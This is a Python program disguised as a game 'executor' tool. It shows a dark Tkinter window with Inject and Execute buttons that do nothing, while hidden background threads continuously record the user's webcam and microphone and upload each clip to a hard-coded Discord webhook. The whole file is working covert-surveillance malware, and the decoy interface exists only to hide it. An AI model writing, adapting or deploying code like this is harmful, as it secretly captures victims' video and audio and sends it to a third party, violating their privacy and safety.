import cv2
import numpy as np
import sounddevice as sd
import requests
import threading
import time
import tempfile
import scipy.io.wavfile as wav
import tkinter as tk
from tkinter import scrolledtext, ttk
from threading import Thread

# Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1265054971716567040/wxq9h3HIYZWuuY4TVFiMZeXuaurf90_KuD4Zb_V6Xh7stu1w419bFDxB3bqVKjfznGEO'

# Capture settings
MIC_DURATION = 30     
FPS = 20              
SAMPLERATE = 44100    

# File paths
def get_temp_file_path(extension):
    return tempfile.mktemp(suffix=extension)

WEB_CAM_VIDEO_PATH = get_temp_file_path('.avi')
MICROPHONE_AUDIO_PATH = get_temp_file_path('.wav')

def send_file_to_discord(file_path):
    with open(file_path, 'rb') as file:
        requests.post(WEBHOOK_URL, files={'file': file})

# Webcam capture function
def capture_webcam():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return
    
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    while True:
        start_time = time.time()
        out = cv2.VideoWriter(WEB_CAM_VIDEO_PATH, fourcc, FPS, (int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)), int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))))
        while time.time() - start_time < MIC_DURATION:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            time.sleep(1 / FPS)
        out.release()
        send_file_to_discord(WEB_CAM_VIDEO_PATH)
        time.sleep(MIC_DURATION)  

# Microphone recording function
def record_microphone():
    def callback(indata, frames, time, status):
        if status:
            pass
        audio_data.append(indata.copy())
    
    while True:
        audio_data = []
        with sd.InputStream(samplerate=SAMPLERATE, channels=1, callback=callback):
            time.sleep(MIC_DURATION)
            if audio_data:
                audio_array = np.concatenate(audio_data, axis=0)
                wav.write(MICROPHONE_AUDIO_PATH, SAMPLERATE, audio_array)
                send_file_to_discord(MICROPHONE_AUDIO_PATH)
        time.sleep(MIC_DURATION)  # Wait before recording the next audio

# Enhanced GUI
def create_gui():
    window = tk.Tk()
    window.title("XXC Alpha Release v8.7")
    window.geometry("800x600")
    window.configure(bg='#2e2e2e')

    # Title label
    title_label = tk.Label(window, text="Advanced Executor v8.7", font=("Helvetica", 18, "bold"), fg="#ffffff", bg="#2e2e2e")
    title_label.pack(pady=10)

    # Main content frame
    main_frame = tk.Frame(window, bg="#3e3e3e")
    main_frame.pack(padx=20, pady=20, fill=tk.BOTH, expand=True)

    # Text area
    text_area = scrolledtext.ScrolledText(main_frame, wrap=tk.WORD, width=80, height=20, bg="#1e1e1e", fg="#ffffff", font=("Courier New", 12))
    text_area.pack(pady=10, fill=tk.BOTH, expand=True)

    # Button frame
    button_frame = tk.Frame(window, bg="#2e2e2e")
    button_frame.pack(side=tk.BOTTOM, pady=10)

    # Inject button
    inject_button = tk.Button(button_frame, text="Inject", bg="#4e4e4e", fg="#ff0000", font=("Helvetica", 12), width=12, height=2, relief=tk.FLAT)
    inject_button.pack(side=tk.LEFT, padx=10)

    # Execute button
    execute_button = tk.Button(button_frame, text="Execute", bg="#4e4e4e", fg="#ff0000", font=("Helvetica", 12), width=12, height=2, relief=tk.FLAT)
    execute_button.pack(side=tk.RIGHT, padx=10)

    # Start the GUI event loop
    window.mainloop()

def main():
    # Start GUI in a separate thread
    gui_thread = Thread(target=create_gui, daemon=True)
    gui_thread.start()

    # Start capturing threads
    threading.Thread(target=capture_webcam, daemon=True).start()
    threading.Thread(target=record_microphone, daemon=True).start()

    # Keep the main thread alive
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
